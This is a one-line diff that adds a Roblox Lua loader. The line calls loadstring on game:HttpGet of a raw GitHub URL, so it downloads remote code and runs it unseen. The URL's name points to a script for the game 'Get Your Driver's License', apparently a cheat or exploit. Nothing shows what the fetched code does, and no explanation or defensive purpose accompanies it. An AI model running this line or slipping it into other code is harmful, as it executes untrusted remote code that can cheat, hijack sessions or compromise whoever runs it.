@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/get-your-driver-s-license-spam0-lo2gmgm9gdybyr.lua"))()
